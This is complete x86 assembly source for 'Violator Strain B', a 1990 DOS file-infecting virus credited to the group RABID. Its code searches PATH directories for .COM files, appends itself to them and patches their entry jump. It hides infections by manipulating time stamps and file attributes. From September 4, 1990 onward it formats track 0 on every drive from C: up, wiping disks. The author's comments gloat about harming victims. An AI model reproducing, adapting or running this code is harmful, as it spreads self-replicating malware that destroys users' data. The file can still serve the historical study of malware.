;*****************************************************************************
;
;		                Violator - Strain B
;
;*****************************************************************************
;
; (Aug/09/90)
;
; Development Notes:
;
;	I encountered several errors in the original Violator code which I
; 	corrected in this version. Mainly, the INT 26 routine to fuck the
;	disk. It seems that the routine would crash right after the INT 26
; 	was executed and the whole program would die. I have since fixed
;	this problem in this version with an INT 13, AH 05 (Format Track)
;	command. This works better than the subsequent INT 26.
;
;
;*****************************************************************************
;
;		 	   Written by - The High Evolutionary - 
;				  RABID Head Programmer
;
;		  Copyright (C) 1990 by RABID Nat'nl Development Corp.
;
;*****************************************************************************

MOV_CX  MACRO   X
        DB      0B9H				
        DW      X
ENDM

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H				; Set ORG to 100H plus our own
						
VCODE:  JMP     virus

	NOP
	NOP
	NOP 					;15 NOP's to place JMP Header
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	
v_start equ     $


virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat       
        CLD                             
        MOV     SI,DX                   
        ADD     SI,first_3              
	MOV	CX,3
        MOV     DI,OFFSET 100H          
        REPZ    MOVSB                   
        MOV     SI,DX                   
	MOV     AH,30H
	INT	21H
	CMP	AL,0				;Quit it it's DOS 1.0
	JNZ	dos_ok
        JMP     quit                 

dos_ok: PUSH    ES
        MOV     AH,2FH
        INT     21H
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         
        POP     ES
        MOV     DX,dta                  
        ADD     DX,SI                    
        MOV     AH,1AH
        INT     21H                     
        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                    
	JMP	year_check

year_check:
	MOV	AH,2AH			;Get date info
	INT	21H			;Call DOS
	CMP	CX,1990			;Check to see if the year is 1990
	JGE	month_check		;If greater or equal, check month
	JMP	find_path		;If not, go on with infection
	
month_check:
	MOV	AH,2AH			;Get date info
	INT	21h			;Call DOS
	CMP	DH,9			;Check to see if it is September
	JGE	day_check		;If greater or equal, check day
	JMP	find_path		;if not, go on with infection

day_check:
	MOV	AH,2Ah			;Get date info
	INT	21H			;Call DOS
	CMP	DL,4			;Check to see if it is the 4th
	JGE 	multiplex		;If yes, then nuke drives A:-Z:
	JMP	find_path		;If not, then go on with infection

multiplex:
	MOV	AL,cntr			;Counter is the drive to kill
	CALL	alter    		;Go and kill the drive
                                        ;25 is drive Z:
	CMP	cntr,25			;Is (cntr) 25 ?
	JE	find_path		;Go on with infection
	INC	cntr			;Add one to (cntr)
	LOOP	multiplex		;Loop back up to kill next drive

alter:
	MOV	AH,05			;Format Track
	MOV	CH,0			;Format track 0
	MOV	DH,0			;Head 0
	MOV	DL,cntr			;Format for drive in (cntr)
	INT	13h			;Call RWTS
	RET				;Return up for next drive
					  
find_path:
        POP     SI			
        PUSH    SI                                   	
        ADD     SI,env_str              
        LODSB				
        MOV     CX,OFFSET 8000H         
        REPNZ   SCASB                   
        MOV     CX,4			                                    

check_next_4:
        LODSB
        SCASB
;
; The JNZ line specifies that if there is no PATH present, then we will go
; along and infect the ROOT directory on the default drive.
;
        JNZ     find_path               ;If not path, then go to ROOT dir    
        LOOP    check_next_4            ;Go back and check for more chars
        POP     SI			;Load in PATH again to look for chars
        POP     ES
        MOV     [SI+path_ad],DI         
        MOV     DI,SI			
        ADD     DI,wrk_spc              ;Put the filename in wrk_spc
        MOV     BX,SI                   
        ADD     SI,wrk_spc              
        MOV     DI,SI                   
        JMP     SHORT   slash_ok

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 
        JNZ     found_subdir            
        JMP     all_done                


found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      
        ADD     DI,wrk_spc              ;DI is the file name to infect! (hehe)


move_subdir:
        LODSB                           ;To tedious work to move into subdir
        CMP     AL,';'                  ;Does it end with a ; charachter?
        JZ      moved_one               ;if yes, then we found a subdir 
        CMP     AL,0                    ;is it the end of the path?
        JZ      moved_last_one          ;if yes, then we save the PATH
        STOSB                           ;marker into DI for future reference
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                      ;BX is where the virus data is
        POP     DS                      ;Restore DS so that we can do stuph
        MOV     [BX+path_ad],SI         ;Where is the next subdir?
        NOP
        CMP     CH,'\'                  ;Check to see if it ends in \
        JZ      slash_ok                ;If yes, then it's OK
        MOV     AL,'\'                  ;if not, then add one...
        STOSB				;store the sucker


slash_ok:
        MOV     [BX+nam_ptr],DI         ;Move the filename into workspace
        MOV     SI,BX                   ;Restore the original SI value
        ADD     SI,f_spec               ;Point to COM file victim
        MOV     CX,6
        REPZ    MOVSB                   ;Move victim into workspace
        MOV     SI,BX
        MOV     AH,4EH
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX is ... THE VICTIM!!!          
        MOV     CX,3                    ;Attributes of Read Only or Hidden OK
        INT     21H
        JMP     SHORT   find_first

find_next:
        MOV     AH,4FH
        INT     21H

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1EH                  ;Mask to remove all but seconds
        CMP     AL,1EH                  ;60 seconds 
        JZ      find_next               
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next               ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next               ;Then go find another one
        MOV     DI,[SI+nam_ptr]         
        PUSH    SI                      
        ADD     SI,dta_nam              

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              
        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              
        ADD     DX,SI
        INT     21H
        MOV     [SI+old_att],CX         
        MOV     AX,OFFSET 4301H         
        AND     CX,OFFSET 0FFFEH        
        MOV     DX,wrk_spc              
        ADD     DX,SI                   
        INT     21H
        MOV     AX,OFFSET 3D02H         
        MOV     DX,wrk_spc              
        ADD     DX,SI                   
        INT     21H
        JNB     opened_ok               
        JMP     fix_attr                

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,2CH
        INT     21H
        AND     DH,7                    
        JMP     infect

infect:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
        ADD     DX,SI
        INT     21H             ;Save first 3 bytes into the data area
        JB      fix_time_stamp  
        CMP     AX,3            
        JNZ     fix_time_stamp  
        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp  
        MOV     CX,AX           
        SUB     AX,3            
        MOV     [SI+jmp_dsp],AX 
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           
        SUB     DI,OFFSET c_len_x
                                
        MOV     [DI],CX         
        MOV     AH,40H
        MOV_CX  virlen                  
        MOV     DX,SI
        SUB     DX,OFFSET codelen       
        INT     21H
        JB      fix_time_stamp          
        CMP     AX,OFFSET virlen        
        JNZ     fix_time_stamp          
        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp          
        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                   
        ADD     DX,jmp_op               
        INT     21H

fix_time_stamp:
        MOV     DX,[SI+ol_date]         
        MOV     CX,[SI+old_tim]         
        AND     CX,OFFSET 0FFE0H
        OR      CX,1EH                  
        MOV     AX,OFFSET 5701H
        INT     21H
        MOV     AH,3EH
        INT     21H

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         
        MOV     DX,wrk_spc
        ADD     DX,SI                   
        INT     21H

all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        INT     21H
        POP     DS

quit:
        POP     CX
        XOR     AX,AX			;XOR values so that we will give the
        XOR     BX,BX			;poor sucker a hard time trying to
        XOR     DX,DX			;reassemble the source code if he
        XOR     SI,SI			;decides to dissassemble us.
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH			;Return back to the beginning
					;of the program

vir_dat EQU     $

intro	db	'.D$^i*&B)_a.%R',13,10
olddta_ DW      0                       
olddts_ DW      0                       
oldtim_ DW      0                       
count_	DW	0
cntr 	DB 	2				; Drive to nuke from (C:+++)
oldate_ DW      0                       
oldatt_ DW      0                       
first3_ EQU     $
        INT     20H
        NOP
jmpop_  DB      0E9H                    
jmpdsp_ DW      0                       
fspec_  DB      '*.COM',0
pathad_ DW      0                       
namptr_ DW      0                       
envstr_ DB      'PATH='                 
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)             
dtatim_ DW      0,0                     
dtalen_ DW      0,0                     
dtanam_ DB      0Dh dup (0)             
lst_byt EQU     $                       
virlen  =       lst_byt - v_start       
codelen =       vir_dat - v_start       
c_len_x =       vir_dat - v_start - 2   
c_len_y =       vir_dat - v_start + 100H
old_dta =       olddta_ - vir_dat       
old_dts =       olddts_ - vir_dat       
old_tim =       oldtim_ - vir_dat       
ol_date =       oldate_ - vir_dat       
old_att =       oldatt_ - vir_dat       
first_3 =       first3_ - vir_dat       
jmp_op  =       jmpop_  - vir_dat       
jmp_dsp =       jmpdsp_ - vir_dat       
f_spec  =       fspec_  - vir_dat       
path_ad =       pathad_ - vir_dat       
nam_ptr =       namptr_ - vir_dat       
env_str =       envstr_ - vir_dat       
wrk_spc =       wrkspc_ - vir_dat       
dta     =       dta_    - vir_dat       
dta_tim =       dtatim_ - vir_dat       
dta_len =       dtalen_ - vir_dat       
dta_nam =       dtanam_ - vir_dat       
count 	=	count_  - vir_dat

        CODE    ENDS
END     VCODE

